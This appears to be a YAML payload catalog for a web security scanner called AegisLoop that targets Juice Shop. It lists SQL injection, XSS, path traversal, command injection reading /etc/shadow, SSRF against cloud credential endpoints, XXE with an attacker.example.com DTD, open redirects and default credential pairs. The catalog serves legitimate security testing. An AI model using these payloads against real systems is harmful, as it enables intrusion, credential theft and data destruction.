# AegisLoop Payload Catalog
# -------------------------
# Variant payloads per MITRE technique.
# Modules currently use a single canonical payload from source — this catalog
# is the extensibility reference for future multi-payload sweep mode.

T1190_sqli:
  name: "SQL Injection"
  owasp: "A03:2021-Injection"
  payloads:
    - "' OR 1=1 --"            # tautology auth bypass (canonical)
    - "' OR '1'='1"            # alternative tautology
    - "admin'--"               # comment-strip bypass
    - "1 UNION SELECT 1,2,3--" # union-based data extraction probe
    - "' AND SLEEP(5)--"       # time-based blind detection
    - "'; DROP TABLE users--"  # destructive marker (WAF signature test)

T1059.007_xss:
  name: "Reflected / Stored XSS"
  owasp: "A03:2021-Injection (XSS)"
  payloads:
    - "<script>alert('AegisLoop_XSS')</script>"  # canonical
    - "<img src=x onerror=alert(1)>"
    - "<svg onload=alert(document.domain)>"
    - "javascript:alert(1)"
    - "';alert('xss');//"
    - "<body onload=alert(1)>"

T1083_lfi:
  name: "Path Traversal / Local File Inclusion"
  owasp: "A01:2021-Broken Access Control"
  payloads:
    - "../../../../etc/passwd"          # canonical
    - "..%2f..%2f..%2fetc%2fpasswd"    # URL-encoded
    - "....//....//etc/passwd"          # double-slash bypass
    - "%2e%2e%2f%2e%2e%2fetc/passwd"   # percent-encoded dots
    - "..\\..\\..\\windows\\win.ini"    # Windows variant
    - "/proc/self/environ"              # Linux process env

T1078_idor:
  name: "Insecure Direct Object Reference (BOLA)"
  owasp: "A01:2021-Broken Access Control"
  payloads:
    - "GET /api/Users/1"    # admin account (canonical)
    - "GET /api/Users/2"
    - "GET /api/Users/0"    # edge case
    - "GET /api/Orders/1"   # horizontal privilege escalation

T1059.004_cmdi:
  name: "Unix Shell Command Injection"
  owasp: "A03:2021-Injection"
  payloads:
    - "; cat /etc/passwd"     # canonical semicolon chain
    - "| id"                  # pipe to id
    - "$(id)"                 # subshell substitution
    - "`whoami`"              # backtick substitution
    - "; ls -la /"
    - "&& cat /etc/shadow"
    - "; ping -c 1 169.254.169.254"  # network probe

T1090.001_ssrf:
  name: "Server-Side Request Forgery"
  owasp: "A10:2021-SSRF"
  payloads:
    - "http://169.254.169.254/latest/meta-data/"               # canonical AWS IMDSv1
    - "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
    - "http://metadata.google.internal/computeMetadata/v1/"    # GCP metadata
    - "http://127.0.0.1:3000/api/Users"                        # internal service
    - "http://[::1]:3000/api/Users"                            # IPv6 loopback
    - "file:///etc/passwd"                                     # file-scheme SSRF

T1005_xxe:
  name: "XML External Entity Injection"
  owasp: "A05:2021-Security Misconfiguration"
  payloads:
    - '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
    - '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/">]><foo>&xxe;</foo>'
    - '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.example.com/evil.dtd">%xxe;]><foo/>'
    - '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;">]><lolz>&lol2;</lolz>'

T1598.003_open_redirect:
  name: "Open Redirect (Phishing Vector)"
  owasp: "A01:2021-Broken Access Control"
  payloads:
    - "https://attacker.example.com/phishing"    # canonical
    - "//attacker.example.com"                    # protocol-relative
    - "/\\attacker.example.com"                   # backslash bypass
    - "https://juice-sh.op.attacker.example.com" # subdomain confusion
    - "https://attacker.example.com@juice-sh.op" # credential-style bypass

T1110.004_credential_stuffing:
  name: "Credential Stuffing"
  owasp: "A07:2021-Identification and Authentication Failures"
  # Format: "email:password"
  credential_pairs:
    - "admin@juice-sh.op:admin123"       # Juice Shop default admin
    - "customer@juice-sh.op:12345"
    - "test@example.com:password"
    - "guest@juice-sh.op:guest"
    - "user@juice-sh.op:password123"
    - "admin@example.com:admin"
    - "root@juice-sh.op:root"

T1562.001_sec_headers:
  name: "Missing Security Headers"
  owasp: "A05:2021-Security Misconfiguration"
  required_headers:
    - "Content-Security-Policy"
    - "X-Content-Type-Options"
    - "X-Frame-Options"
    - "Strict-Transport-Security"
    - "Referrer-Policy"
    - "Permissions-Policy"
    - "Cross-Origin-Opener-Policy"
